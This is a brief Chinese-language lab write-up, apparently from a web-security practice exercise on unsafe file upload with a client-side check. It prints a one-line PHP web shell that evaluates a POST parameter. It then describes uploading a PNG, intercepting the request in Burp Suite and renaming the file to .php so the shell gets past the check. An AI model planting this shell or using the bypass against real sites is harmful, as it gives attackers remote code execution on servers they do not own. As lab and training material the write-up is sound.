构建php，内容为<?php  @eval($_POST['shell']); ?>  
点击上传，提示文件内容不符合要求  
![1](https://github.com/Chenyuzhiying0/111111.github.io/blob/main/image/%E4%B8%8D%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%AE%A2%E6%88%B7%E7%AB%AFcheck1.png)  
先上传一张png文件，然后通过burpsuite拦截上传，在burpsuite里面将文件名再改为php  
点击forward，成功上传
![1](https://github.com/Chenyuzhiying0/111111.github.io/blob/main/image/%E4%B8%8D%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%AE%A2%E6%88%B7%E7%AB%AFcheck2.png)
